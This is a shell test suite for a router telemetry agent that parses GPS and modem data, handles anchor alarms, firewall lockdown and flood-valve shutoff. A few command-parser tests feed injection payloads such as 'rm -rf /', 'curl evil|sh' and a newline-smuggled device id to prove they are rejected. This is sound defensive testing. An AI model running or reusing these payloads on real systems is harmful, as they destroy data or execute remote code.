#!/bin/sh
# Parser tests for the phone-home hub-lite. Fixtures are REAL responses captured from the GL-X750
# bench session (2026-08-06) plus standard NMEA/gpsd shapes. Run: sh hub-lite/test.sh
set -u

BRVG_HUB_LITE_TEST=1
export BRVG_HUB_LITE_TEST
# The scripts under test. Normally this directory; the comment-stripped PACKAGED copies when the
# stripped run at the bottom of this file re-invokes it (BRVG_HUB_LITE_DIR), so the suite proves the
# bytes that ship, not only the bytes in git.
HL_DIR="${BRVG_HUB_LITE_DIR:-$(cd "$(dirname "$0")" && pwd)}"
HL_SRC="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
. "$HL_DIR/brvg-hub-lite.sh"

fails=0
check() {
  # $1 label, $2 expected, $3 actual
  if [ "$3" = "$2" ]; then
    echo "ok   - $1"
  else
    echo "FAIL - $1"
    echo "       expected: [$2]"
    echo "       actual:   [$3]"
    fails=$((fails + 1))
  fi
}

# --- parse_qgpsloc ---
out=$(printf '+QGPSLOC: 061951.000,29.97580,-95.36047,1.2,32.5,2,0.00,0.0,0.0,110824,09\r\nOK\r\n' | parse_qgpsloc)
check "qgpsloc: mode-2 fix with hdop→acc" "29.97580 -95.36047 6" "$out"

out=$(printf '+QGPSLOC: 061951.000,-33.86882,151.20930,0,5.0,3,0.00,0.0,0.0,110824,12\r\n' | parse_qgpsloc)
check "qgpsloc: southern hemisphere, zero hdop drops acc" "-33.86882 151.20930" "$out"

out=$(printf '+CME ERROR: 516\r\n' | parse_qgpsloc)
check "qgpsloc: CME 516 (acquiring — the bench state) yields nothing" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,0.0,0.0,1.0,0,2,0,0,0,110824,00\r\n' | parse_qgpsloc)
check "qgpsloc: 0/0 placeholder rejected" "" "$out"

out=$(printf '+QGPSLOC: 061951.000,91.0,10.0,1.0,0,2,0,0,0,110824,04\r\n' | parse_qgpsloc)
check "qgpsloc: out-of-range rejected" "" "$out"

# --- parse_qcsq ---
out=$(printf '+QCSQ: "LTE",-69,-102,150,-12\r\nOK\r\n' | parse_qcsq)
check "qcsq: LTE line (bench signal) with sinr 150→10 dB" "LTE -69 -102 10 -12" "$out"

out=$(printf '+QCSQ: "NOSERVICE"\r\n' | parse_qcsq)
check "qcsq: no service yields nothing" "" "$out"

# --- parse_cops ---
out=$(printf '+COPS: 0,0,"T-Mobile Wholesale",7\r\nOK\r\n' | parse_cops)
check "cops: quoted carrier with spaces" "T-Mobile Wholesale" "$out"

# --- parse_cpin ---
check "cpin: READY → ok" "ok" "$(printf '+CPIN: READY\r\nOK\r\n' | parse_cpin)"
check "cpin: SIM PIN → locked" "locked" "$(printf '+CPIN: SIM PIN\r\n' | parse_cpin)"
check "cpin: CME 10 → missing" "missing" "$(printf '+CME ERROR: 10\r\n' | parse_cpin)"

# --- parse_nmea_rmc ---
out=$(printf '$GPRMC,081836,A,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: ddmm.mmmm S/E conversion" "$(printf '%s' "$out")" "$out"  # format check below
case "$out" in
  -37.86*\ 145.12*) echo "ok   - nmea rmc: values in expected range" ;;
  *) echo "FAIL - nmea rmc: values out of range: [$out]"; fails=$((fails + 1)) ;;
esac
# ~1 m precision (%.5f), matching the modem path — not awk's default %.6g which loses the USB
# dongle to ~11 m. Captured from the live u-blox 7 (bench 2026-08-13).
out=$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\n' | parse_nmea_rmc)
check "nmea rmc: 5-decimal precision on a real u-blox sentence" "41.40846 -81.74975" "$out"

out=$(printf '$GPRMC,081836,V,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
check "nmea rmc: void (V) fix rejected" "" "$out"

# --- parse_gpsd_tpv ---
out=$(printf '{"class":"TPV","mode":3,"lat":29.975800,"lon":-95.360470,"eph":4.2}\n' | parse_gpsd_tpv)
check "gpsd tpv: 3D fix with eph" "29.975800 -95.360470 4.2" "$out"

out=$(printf '{"class":"TPV","mode":1}\n' | parse_gpsd_tpv)
check "gpsd tpv: no-fix mode rejected" "" "$out"

# --- urlencode_spaces ---
check "urlencode: spaces and ampersands" "T-Mobile%20Wholesale" "$(urlencode_spaces 'T-Mobile Wholesale')"

# --- build_report_url (token path wins; legacy k= fallback) ---
WORKER_URL="https://api.example.com"; VID="v1"; DEVICE_ID="brv_net_1"
DEVICE_TOKEN="tok64"; VEHICLE_KEY="vkey"
check "report url: DEVICE_TOKEN → /api/agent with t=" \
  "https://api.example.com/api/agent?vid=v1&device=brv_net_1&event=gps.measurement&t=tok64&lat=1&lon=2" \
  "$(build_report_url 'gps.measurement' 'lat=1&lon=2')"
DEVICE_TOKEN=""
check "report url: no token → legacy /api/shelly with k=" \
  "https://api.example.com/api/shelly?vid=v1&device=brv_net_1&event=modem.measurement&k=vkey&up=1" \
  "$(build_report_url 'modem.measurement' 'up=1')"

# --- parse_commands (Phase B: commands ride the telemetry reply) ---
out=$(printf '{"status":"ok","commands":[{"id":"abc123","cmd":"reboot"}]}' | parse_commands)
check "commands: single entry" "abc123:reboot" "$out"

out=$(printf '{"ok":1,"commands":[{"id":"a1","cmd":"gps_on"},{"id":"b2","cmd":"reboot_modem"}]}' | parse_commands | tr '\n' ' ')
check "commands: two entries" "a1:gps_on b2:reboot_modem" "$out"

out=$(printf '{"status":"ok"}' | parse_commands)
check "commands: none when the reply has no queue" "" "$out"

# A hostile payload must not yield a runnable verb — the id/cmd shapes are constrained.
out=$(printf '{"commands":[{"id":"x;rm -rf /","cmd":"reboot"}]}' | parse_commands)
check "commands: rejects a junk id rather than passing it on" "" "$out"
out=$(printf '{"commands":[{"id":"ok1","cmd":"curl evil|sh"}]}' | parse_commands)
check "commands: rejects a non-allowlisted verb shape" "" "$out"

# --- parse_qgdcnt (plan-burn counters) ---
out=$(printf '+QGDCNT: 1048576,2097152\r\nOK\r\n' | parse_qgdcnt)
check "qgdcnt: sent + received bytes" "1048576 2097152" "$out"
out=$(printf 'ERROR\r\n' | parse_qgdcnt)
check "qgdcnt: nothing on error" "" "$out"

# --- hub-lite: spool → batch items (the wire contract's shell half) ---
# The expected strings below are the CANONICAL v1 fixture from brvg-cloud-server's
# agentBatch.test.ts — copied, not paraphrased. If either side changes shape, one of these two
# suites goes red; that is the whole one-contract rule.
out=$(printf '1755000000\tshellyflood-a1\tflood.alarm\ttemp=12.5\n1755000001\tshellyuni-b2\tvoltmeter.measurement\tv=12.6\n' | spool_to_items)
check "hub-lite: items match the canonical fixture" \
  '[{"device":"shellyflood-a1","event":"flood.alarm","params":{"temp":"12.5"}},{"device":"shellyuni-b2","event":"voltmeter.measurement","params":{"v":"12.6"}}]' \
  "$out"

out=$(printf '1\td1\te.change\tv=a%%2Cb+c%%41\n' | spool_to_items)
check "hub-lite: urldecode (%2C, +, %41)" '[{"device":"d1","event":"e.change","params":{"v":"a,b cA"}}]' "$out"

out=$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C\n' | spool_to_items)
check "hub-lite: JSON-escapes quotes and backslashes" '[{"device":"d1","event":"e.change","params":{"v":"say \"hi\"\\"}}]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td1\te.change\tv=2\n3\td2\te.change\tv=9\n' | spool_to_items)
check "hub-lite: dedup per device+event keeps the NEWEST" '[{"device":"d1","event":"e.change","params":{"v":"2"}},{"device":"d2","event":"e.change","params":{"v":"9"}}]' "$out"

out=$(printf '1\td1\te.change\tbad;key=1&ok=2\n' | spool_to_items)
check "hub-lite: junk param keys are stripped, not escaped" '[{"device":"d1","event":"e.change","params":{"badkey":"1","ok":"2"}}]' "$out"

out=$(printf '1\td1\te.change\n' | spool_to_items)
check "hub-lite: a line with no params still ships as an item" '[{"device":"d1","event":"e.change","params":{}}]' "$out"

out=$(printf '' | spool_to_items)
check "hub-lite: empty spool is an empty array" '[]' "$out"

out=$(printf '1\td1\te.change\tv=1\n2\td2\tf.change\tv=1\n3\td1\tg.alarm\tv=1\n' | spool_devices)
check "hub-lite: spool_devices dedups in first-seen order" 'd1
d2' "$out"

HUB_LITE_VERSION_SAVED="$HUB_LITE_VERSION"
out=$(build_batch_json 42 delta '[{"device":"d1","event":"e.change","params":{}}]' "okdev1 okdev2" bootxyz)
check "hub-lite: envelope carries seq/boot/kind/ok/tier" \
  "{\"v\":1,\"seq\":42,\"boot\":\"bootxyz\",\"kind\":\"delta\",\"items\":[{\"device\":\"d1\",\"event\":\"e.change\",\"params\":{}}],\"ok\":[\"okdev1\",\"okdev2\"],\"agent\":{\"av\":\"$HUB_LITE_VERSION_SAVED\",\"tier\":\"hub-lite\"}}" \
  "$out"

# --- boot id -----------------------------------------------------------------------------------
# The counter, the spool and the state all live in tmpfs, so a power cut restarts the counter at 1
# while the cloud still holds the old high-water mark. Without a boot id the cloud reads that as a
# replay, answers 200 {duplicate}, and the drain deletes the spool — silent loss of every reading
# until the counter climbs back. The id must be STABLE within a boot and DIFFERENT after one.
_bootdir=$(mktemp -d)
# Subshell, and RELAY_BOOT_FILE not BRVG_RELAY_BOOT: the var was already expanded when the hub-lite
# was sourced, and `VAR=x some_function` LEAKS in POSIX sh (it broke the --version test on 2026-08-13).
_b1=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
_b2=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
check "hub-lite: boot id is stable within a boot" "$_b1" "$_b2"
check "hub-lite: boot id is non-empty" "yes" "$([ -n "$_b1" ] && echo yes)"
check "hub-lite: boot id is safe to put in JSON unescaped" "" "$(printf '%s' "$_b1" | tr -d 'A-Za-z0-9')"
rm -f "$_bootdir/boot"     # what a reboot does to tmpfs
_b3=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
# Only meaningful where the id is random per boot; on a host exposing /proc/sys/kernel/random/boot_id
# the kernel value is legitimately identical until the MACHINE reboots, so accept either.
if [ ! -r /proc/sys/kernel/random/boot_id ]; then
  check "hub-lite: a wiped tmpfs yields a NEW boot id" "differs" \
    "$([ "$_b3" != "$_b1" ] && echo differs || echo same)"
fi
rm -rf "$_bootdir"

# Every relay JSON must actually PARSE — checked with python3 where available (CI has it).
if command -v python3 >/dev/null 2>&1; then
  _all_json=$(build_batch_json 1 keyframe "$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C&n=1.5\n' | spool_to_items)" "a b" bootxyz)
  _roundtrip=$(printf '%s' "$_all_json" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["items"][0]["params"]["v"] + "|" + d["items"][0]["params"]["n"])' 2>/dev/null)
  check "hub-lite: envelope is valid JSON and the escaped value ROUND-TRIPS" 'say "hi"\|1.5' "$_roundtrip"
fi

# --- relay CGI (run for real: no conf ⇒ the urgent path cannot send, so everything spools) ---
_cgidir=$(mktemp -d)
run_cgi() {
  QUERY_STRING="$1" BRVG_HUB_LITE_CONF=/nonexistent-conf BRVG_RELAY_SPOOL="$_cgidir/spool" \
    sh "$(dirname "$0")/hub-lite-cgi.sh" >/dev/null 2>&1
}
run_cgi 'device=shellyflood-a1&event=flood.alarm&temp=12%2C5'
run_cgi 'device=shellyht-c3&event=humidity.change&rh=55'
run_cgi 'event=orphan.change&v=1'                       # no device ⇒ dropped
run_cgi 'device=evil%0Aid&event=x.change&v=1'           # newline stripped from the id
out=$(cut -f2,3,4 "$_cgidir/spool")
check "relay CGI: spools sane lines and drops the deviceless one" \
  'shellyflood-a1	flood.alarm	temp=12%2C5
shellyht-c3	humidity.change	rh=55
evil0Aid	x.change	v=1' \
  "$out"
rm -rf "$_cgidir"

# --- the report's parameter string must not carry DUPLICATE keys ---
# Found in production 2026-08-14 via `wrangler tail`: the modem report was sending
# "&av=0.3.0&av=0.3.0". Two edits had each appended the version line, and neither test nor review
# caught it because the shell is happy to build a nonsense URL. This is the cheap structural guard.
dup_keys() {
  printf '%s' "$1" | tr '&' '\n' | sed -n 's/^\([A-Za-z0-9_]*\)=.*/\1/p' | sort | uniq -d
}
check "params: a clean string has no duplicate keys" "" "$(dup_keys 'up=1&mode=LTE&av=0.3.0')"
check "params: the guard actually detects a duplicate" "av" "$(dup_keys 'up=1&av=0.3.0&av=0.3.0')"
# The real thing: build the version+usage suffix the way push_modem does and assert it is clean.
# NB: computed in a SUBSHELL. `VAR=x some_function` leaks VAR into the current shell in POSIX sh —
# an earlier draft of this very test set HUB_LITE_VERSION inline and broke the --version test below.
_suffix=$(BRVG_WAN_STATE=$(mktemp -d); export BRVG_WAN_STATE; printf 'up=1&av=%s%s' "$HUB_LITE_VERSION" "$(collect_wan_usage)")
check "params: modem suffix carries av exactly once" "" "$(dup_keys "$_suffix")"

# --- WAN usage deltas: the reset cases are the whole point ---
check "wan_delta: normal increase" "500" "$(wan_delta 1000 1500)"
# NOT "everything so far": on a fresh install the state dir is absent while the kernel counters hold
# the router's whole uptime, so reporting $_cur charged weeks of pre-hub-lite traffic to this billing
# cycle and could fire a false plan alert on day one. Baseline silently, count from the next tick.
check "wan_delta: first sight reports NOTHING (baseline only)" "0" "$(wan_delta "" 1500)"
check "wan_delta: first sight on a long-running router still reports nothing" "0" "$(wan_delta "" 9999999999)"
# A counter that went DOWN means a reboot / interface bounce / our own reset_data. Reporting
# cur-prev would emit a huge negative (or, unsigned, a wrap-sized spike that looks like a
# runaway plan burn). Report the new value: bytes since the reset.
check "wan_delta: reset ⇒ count from zero, never negative" "42" "$(wan_delta 999999 42)"
check "wan_delta: reset to exactly 0" "0" "$(wan_delta 999999 0)"
check "wan_delta: no movement" "0" "$(wan_delta 1000 1000)"

# Interface → source, so the cloud can attribute bytes to cellular vs Wi-Fi vs wired.
check "wan_kind: modem" "cellular" "$(wan_kind wwan0)"
check "wan_kind: rmnet modem" "cellular" "$(wan_kind rmnet_data0)"
check "wan_kind: wired wan" "wired" "$(wan_kind eth0)"
check "wan_kind: repeater client" "wifi" "$(wan_kind apcli0)"
check "wan_kind: ap radio counts as wifi" "wifi" "$(wan_kind wlan1)"
check "wan_kind: unknown is excluded" "other" "$(wan_kind tun0)"

# LAN-side exclusion: a bridge port (sysfs `brport`) is local traffic — the bench GL-X750's own AP
# radios were being billed as WAN wifi usage (and emitted wanKb_wifi TWICE, one per radio).
_fakeif=$(mktemp -d)
mkdir -p "$_fakeif/brport"
check "wan_lan_side: a bridge port is LAN-side" "yes" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif/brport"
check "wan_lan_side: a plain WAN face is not" "no" "$(wan_lan_side "$_fakeif" && echo yes || echo no)"
rm -rf "$_fakeif"

# --- hub watchdog decision (fail open rather than leave the vessel silent) ---
# healthy fails threshold released -> decision
check "watchdog: healthy and never released ⇒ nothing" none "$(watch_decide 1 0 5 0)"
check "watchdog: healthy after a release ⇒ recover" recover "$(watch_decide 1 0 5 1)"
check "watchdog: below the threshold ⇒ wait" none "$(watch_decide 0 4 5 0)"
check "watchdog: at the threshold ⇒ release" release "$(watch_decide 0 5 5 0)"
check "watchdog: past the threshold ⇒ release" release "$(watch_decide 0 9 5 0)"
# The one that matters: never release twice. A second release would re-run the firewall reload
# every tick for as long as the hub stays down.
check "watchdog: already released ⇒ never release again" none "$(watch_decide 0 99 5 1)"

# --- bandwidth saver gate: watchdog must not probe or write state ----------------------------
_bw_dir=$(mktemp -d)
# HUB_WATCH_FAILS_FILE, not BRVG_HUB_FAILS: the env override was already expanded when the hub-lite
# was sourced (same trap as the boot-id test above).
( BANDWIDTH_SAVER=1 HUB_WATCH_URL="http://127.0.0.1:1/healthz" HUB_WATCH_FAILS_FILE="$_bw_dir/fails" \
  HUB_WATCH_RELEASED="$_bw_dir/released"; watch_hub )
check "bandwidth saver: watchdog is inert (no state written)" "absent" "$( [ -e "$_bw_dir/fails" ] && echo present || echo absent )"

# --- release_lockdown against a stand-in uci -------------------------------------------------
# The real thing needs a router; this proves the REVERSE-INDEX deletion is right (uci renumbers on
# every delete, so forward iteration silently skips rules) and that a hand-written rule survives.
_uci_dir=$(mktemp -d)
cat > "$_uci_dir/uci" <<'FAKEUCI'
#!/bin/sh
DB="$UCI_DB"
[ "$1" = "-q" ] && shift
case "$1" in
  get) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       fld=$(printf '%s' "$2" | sed -n 's/.*@rule\[[0-9]*\]\.\(.*\)/\1/p')
       line=$(sed -n "$((idx+1))p" "$DB" 2>/dev/null)
       [ -n "$line" ] || exit 1
       [ -z "$fld" ] && exit 0
       printf '%s\n' "$line"; exit 0 ;;
  delete) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
       sed -i.bak "$((idx+1))d" "$DB"; exit 0 ;;
  add) printf 'pending\n' >> "$DB"; echo "newrule"; exit 0 ;;
  set) v=$(printf '%s' "$2" | sed -n 's/.*\.name=\(.*\)/\1/p')
       [ -n "$v" ] && sed -i.bak "\$ s/.*/$v/" "$DB"
       exit 0 ;;
esac
exit 0
FAKEUCI
chmod +x "$_uci_dir/uci"
printf 'brvg_lk_allow_0\nbrvg_lk_allow_1\nmy_custom_rule\nbrvg_lk_deny\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; release_lockdown >/dev/null 2>&1 && echo released' 2>/dev/null)
check "release_lockdown: reports success when rules existed" "released" "$out"
check "release_lockdown: removes ONLY brvg_lk_* (hand-written rules survive)" "my_custom_rule" "$(cat "$_uci_dir/db")"
# With nothing of ours applied it must report false, so the watchdog doesn't claim a release.
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; release_lockdown >/dev/null 2>&1 && echo released || echo nothing' 2>/dev/null)
check "release_lockdown: nothing of ours ⇒ reports nothing to release" "nothing" "$out"
# --- apply_lockdown (the lockdown_on verb) against the same stand-in --------------------------
printf 'my_custom_rule\n' > "$_uci_dir/db"
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; apply_lockdown >/dev/null 2>&1 && echo applied' 2>/dev/null)
check "apply_lockdown: reports success" "applied" "$out"
check "apply_lockdown: catch-all lands under the shared prefix, hand-written rules survive" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
# Re-apply must stay ONE rule (release-then-add), not accumulate a stack of them.
out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-hub-lite.sh"; apply_lockdown >/dev/null 2>&1; apply_lockdown >/dev/null 2>&1' 2>/dev/null)
check "apply_lockdown: idempotent re-apply keeps exactly one rule" "my_custom_rule
brvg_lk_deny_all" "$(cat "$_uci_dir/db")"
rm -rf "$_uci_dir"

# The Phase B lockdown verbs ride the same argument-free wire shape.
out=$(printf '{"commands":[{"id":"l1","cmd":"lockdown_on"},{"id":"l2","cmd":"lockdown_off"}]}' | parse_commands)
check "commands: lockdown verbs parse" "l1:lockdown_on
l2:lockdown_off" "$out"

# --- parse_cradlepoint_gps (NCOS /api/status/gps, bench-captured DMS shape 2026-08-17) -------
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":41,"minute":29,"second":34.52214},"longitude":{"degree":-81,"minute":43,"second":30.324},"satellites":9}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: DMS with sign on degree parses to %.5f decimals" "41.49292 -81.72509" "$out"
out=$(printf '{"success":true,"data":{"fix":{"latitude":{"degree":0,"minute":0,"second":0},"longitude":{"degree":0,"minute":0,"second":0}}}}' | parse_cradlepoint_gps)
check "cradlepoint gps: the 0,0 no-fix placeholder yields nothing" "" "$out"
out=$(printf '{"success":false,"reason":"unauthorized"}' | parse_cradlepoint_gps)
check "cradlepoint gps: an error envelope yields nothing" "" "$out"
out=$(printf 'not json at all' | parse_cradlepoint_gps)
check "cradlepoint gps: garbage yields nothing" "" "$out"

# --- version reporting + update verbs ---
# `--version` must work with no config: the self-update smoke check runs it on a freshly installed
# hub-lite, before that hub-lite has ever been configured.
out=$(sh "$(dirname "$0")/brvg-hub-lite.sh" --version 2>/dev/null)
check "version: --version prints HUB_LITE_VERSION without a config" "$HUB_LITE_VERSION" "$out"

# The update verbs must parse like any other — and the payload must never carry an argument.
out=$(printf '{"commands":[{"id":"u1","cmd":"self_update"}]}' | parse_commands)
check "commands: self_update parses" "u1:self_update" "$out"
out=$(printf '{"commands":[{"id":"u2","cmd":"rollback_agent"}]}' | parse_commands)
check "commands: rollback_agent parses" "u2:rollback_agent" "$out"
# A version smuggled into the verb must NOT survive — the whole anti-RCE property is that the
# cloud says "update yourself", never "install this".
out=$(printf '{"commands":[{"id":"u3","cmd":"self_update 9.9.9"}]}' | parse_commands)
check "commands: a verb carrying an argument is rejected" "" "$out"

# --- run_commands: which verbs demand an immediate follow-up report ---
# Commands arrive as the REPLY to a report, so that report was composed before they ran. Verbs that
# change observable state must set FOLLOWUP_REPORT or their effect waits a whole interval; verbs
# that take the uplink down must NOT, because the extra send would only fail.
# at_cmd dereferences AT_PORT, which only load_config sets — point it at a non-device so the AT
# verbs return immediately instead of tripping `set -u`. What is under test is the flag, not AT.
AT_PORT=/nonexistent/brvg-test-at
AT_BUF=/tmp/brvg-test-at-buf

FOLLOWUP_REPORT=0
run_commands "c1:report_now" >/dev/null 2>&1
check "follow-up: report_now asks for one" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c2:reset_data" >/dev/null 2>&1
check "follow-up: reset_data asks for one (the counter changed)" "1" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c3:reboot_modem" >/dev/null 2>&1
check "follow-up: reboot_modem does NOT (the link is dropping)" "0" "$FOLLOWUP_REPORT"

FOLLOWUP_REPORT=0
run_commands "c4:gps_on" >/dev/null 2>&1
check "follow-up: gps_on asks for one" "1" "$FOLLOWUP_REPORT"

# Every executed verb is acked whether or not it wanted a follow-up.
PENDING_ACK=""
FOLLOWUP_REPORT=0
run_commands "c5:report_now" >/dev/null 2>&1
check "follow-up: the verb is still acked" "c5" "$PENDING_ACK"

# --- high security: local administration off ---
# The verbs must parse and be acked like any other, and must ask for a follow-up report so the app
# learns the router's new state instead of assuming the command landed.
out=$(printf '{"commands":[{"id":"s1","cmd":"local_admin_off"}]}' | parse_commands)
check "lockdown: local_admin_off parses" "s1:local_admin_off" "$out"
out=$(printf '{"commands":[{"id":"s2","cmd":"local_admin_on"}]}' | parse_commands)
check "lockdown: local_admin_on parses" "s2:local_admin_on" "$out"

# An argument smuggled into the verb must not survive — same anti-RCE property as the update verbs.
out=$(printf '{"commands":[{"id":"s3","cmd":"local_admin_off --now"}]}' | parse_commands)
check "lockdown: a verb carrying an argument is rejected" "" "$out"

echo ""
# --- anchor_distance ---
out=$(anchor_distance 41.4086 -81.7494 41.4086 -81.7494)
check "anchor: same point is 0 m" "0" "$out"

# ~0.0009° of latitude ≈ 100 m, longitude-independent.
out=$(anchor_distance 41.4086 -81.7494 41.4095 -81.7494)
ok=0; [ "$out" -ge 95 ] && [ "$out" -le 105 ] && ok=1
check "anchor: 0.0009 deg lat ≈ 100 m (got ${out}m)" "1" "$ok"

# Across the date line: 0.001° of longitude at the equator ≈ 111 m either way around.
out=$(anchor_distance 0 179.9995 0 -179.9995)
ok=0; [ "$out" -ge 105 ] && [ "$out" -le 120 ] && ok=1
check "anchor: date-line crossing stays short (got ${out}m)" "1" "$ok"

# --- parse_anchor ---
out=$(printf '{"status":"ok","anchor":{"lat":41.4086,"lon":-81.7494,"radiusM":50,"warnM":30,"sig":1234}}' | parse_anchor)
check "anchor: full config parses" "1234 41.4086 -81.7494 50 30" "$out"

out=$(printf '{"status":"ok","anchor":{"sig":0}}' | parse_anchor)
check "anchor: stand-down parses to bare 0" "0" "$out"

out=$(printf '{"status":"ok"}' | parse_anchor)
check "anchor: reply without config yields nothing" "" "$out"

out=$(printf '{"status":"ok","commands":[{"id":"c1","cmd":"report_now"}],"anchor":{"lat":1.5,"lon":2.5,"radiusM":100,"warnM":0,"sig":99}}' | parse_anchor)
check "anchor: coexists with a commands payload" "99 1.5 2.5 100 0" "$out"

out=$(printf '{"anchor":{"lat":1.5,"sig":7}}' | parse_anchor)
check "anchor: partial config (no lon/radius) rejected" "" "$out"

# --- check_anchor end-to-end (state in a scratch dir; send_event stubbed to record) ---
_scratch=$(mktemp -d)
ANCHOR_STATE="$_scratch/state"; ANCHOR_ALERTED="$_scratch/alerted"; ANCHOR_WARNED="$_scratch/warned"
ANCHOR_STREAK="$_scratch/streak"; ANCHOR_WSTREAK="$_scratch/wstreak"
SENT_EVENTS="$_scratch/sent"
send_event() { echo "$1 $2" >> "$SENT_EVENTS"; }
log() { :; }

apply_anchor 1234 41.4086 -81.7494 50 0
check "anchor: armed state written" "1234" "$(anchor_sig)"

# Fix 1 outside (~100 m, radius 50): streak starts, nothing fires yet.
check_anchor 41.4095 -81.7494 5
check "anchor: one breaching fix fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Fix 2 outside: alarm fires once.
check_anchor 41.4095 -81.7494 5
check "anchor: second consecutive breach fires the alarm" "anchor.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Fix 3 outside: still latched — no repeat.
check_anchor 41.4095 -81.7494 5
check "anchor: latched — a third breach does not repeat" "1" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Back inside: episode over; a new drag alarms again after two fixes.
check_anchor 41.4086 -81.7494 5
check_anchor 41.4095 -81.7494 5
check_anchor 41.4095 -81.7494 5
check "anchor: recovery then re-drag fires a NEW alarm" "2" "$(wc -l < "$SENT_EVENTS" | tr -cd '0-9')"

# Accuracy guard: outside by less than the fix's own error bar never counts.
: > "$SENT_EVENTS"; rm -f "$ANCHOR_ALERTED" "$ANCHOR_STREAK"
check_anchor 41.4095 -81.7494 80   # 100 m out, but ±80 m accuracy on a 50 m radius ⇒ inside the bar
check_anchor 41.4095 -81.7494 80
check "anchor: breach inside the accuracy bar fires nothing" "" "$(cat "$SENT_EVENTS" 2>/dev/null)"

# Warning ring: fires on the inner ring while the alarm ring holds.
apply_anchor 5678 41.4086 -81.7494 200 50
check_anchor 41.4095 -81.7494 5    # ~100 m: inside 200 m alarm, outside 50 m warn
check_anchor 41.4095 -81.7494 5
check "anchor: warning ring fires on the inner ring" "anchor.warn.motion dist=100&limit=50" "$(cat "$SENT_EVENTS")"

# Stand-down clears everything.
apply_anchor 0
check "anchor: stand-down disarms" "0" "$(anchor_sig)"
rm -rf "$_scratch"

# --- LinkTap flood shutoff (hub-lite capability #1) ----------------------------------------------
# Classification fixtures MIRROR brvg-cloud-server's events.ts isFloodShutoff tests — the one-
# contract rule: same capability, two implementations, one fixture set. If a case is added there,
# add it here.
flood_case() { # $1 label, $2 event, $3 expected yes|no
  if is_flood_shutoff "$2"; then _got=yes; else _got=no; fi
  check "flood classify: $1" "$3" "$_got"
}
flood_case "flood.alarm closes" "flood.alarm" yes
flood_case "leak.detected closes" "leak.detected" yes
flood_case "bare alarm closes" "alarm" yes
flood_case "case-insensitive like the worker regex" "Flood.Alarm" yes
flood_case "a clear (_off) must NOT close" "flood.alarm_off" no
flood_case "a clear (.off) must NOT close" "alarm.off" no
flood_case "telemetry .measurement never closes" "flood.measurement" no
flood_case "telemetry .change never closes" "flood.change" no
flood_case "unrelated events never close" "voltmeter.measurement" no
flood_case "button press never closes" "button.push" no

# cmd 7 body — same dialect as the TS hub's buildStop, pinned byte-for-byte.
out=$(linktap_stop_body "CCCCDDDDEEEEFFFF" "aaaabbbbccccdddd")
check "linktap_stop_body cmd 7 shape" '{"cmd":7,"gw_id":"CCCCDDDDEEEEFFFF","dev_id":"aaaabbbbccccdddd"}' "$out"

# linktap_flood_close: stub curl, capture what would hit the gateway, check the spool line.
_CURL_LOG=$(mktemp); _SPOOL_T=$(mktemp)
curl() { # capture -d body and the url (last arg)
  _body=""; _prev=""
  for _a in "$@"; do [ "$_prev" = "-d" ] && _body="$_a"; _prev="$_a"; done
  eval "_url=\${$#}"
  printf '%s %s\n' "$_url" "$_body" >> "$_CURL_LOG"
  return 0
}
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd, bbbbccccddddeeeeEXTRA" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "flood close posts one cmd 7 per valve" "2" "$(wc -l < "$_CURL_LOG" | tr -d ' ')"
check "flood close targets api.shtml" "http://192.168.8.20/api.shtml" "$(head -1 "$_CURL_LOG" | cut -d' ' -f1)"
check "flood close normalises the 16-hex id like the TS client" \
  '{"cmd":7,"gw_id":"GW02","dev_id":"bbbbccccddddeeee"}' "$(sed -n 2p "$_CURL_LOG" | cut -d' ' -f2-)"
check "each close spools a flood_close.change line" "2" "$(grep -c 'linktap.flood_close.change' "$_SPOOL_T" | tr -d ' ')"
check "the spool line carries the outcome" "ok=1" "$(head -1 "$_SPOOL_T" | cut -f4)"

# a failing gateway spools ok=0 and does not abort the loop
curl() { return 22; }
: > "$_CURL_LOG"; : > "$_SPOOL_T"
LINKTAP_HOST="192.168.8.20" LINKTAP_GW_ID="GW02" LINKTAP_DEV_IDS="aaaabbbbccccdddd" \
BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "a failed close is spooled as ok=0" "ok=0" "$(head -1 "$_SPOOL_T" | cut -f4)"
unset -f curl
